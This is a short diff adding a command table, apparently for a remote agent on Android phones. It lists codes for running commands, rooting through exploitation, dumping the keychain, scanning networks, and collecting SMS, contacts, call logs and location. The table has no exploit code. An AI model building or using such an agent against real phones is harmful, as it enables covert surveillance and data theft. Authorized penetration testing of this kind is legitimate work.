@@ -1,0 +1,22 @@
+APKS none Get a list of installed apps
+UAPK apk:toupload Upload an APK 
+SPAM target:number,message:textmessage Send a text
+DELE none Delete Agent from target phone
+DOWN file:todownload Download a file to the phone
+UPLD file:toupload Upload a file from the phone
+GETS none Get device management settings
+SETS setting:tochange,value:tosetto Change a setting
+EBLU none Enable Bluetooth
+GBLU none Get paired Bluetooth devices
+SBLU none Scan nearby Bluetooth devices
+ROOT none Attempt to get temporial root through exploitation
+LKEY none Post root list keychain entries
+EXEC execcommand:command,downloaded:yes Execute a command
+EXUP execcomand:command,downloaded:no Execute a command and upload output
+SHOW message:toshow Show a popup with message
+NMAP target:toscan Nmap systems on the Wifi network
+SMSS none Get recieved text messages
+CONT none Get contacts
+CALL none Get calls
+LOCA none Get location
+
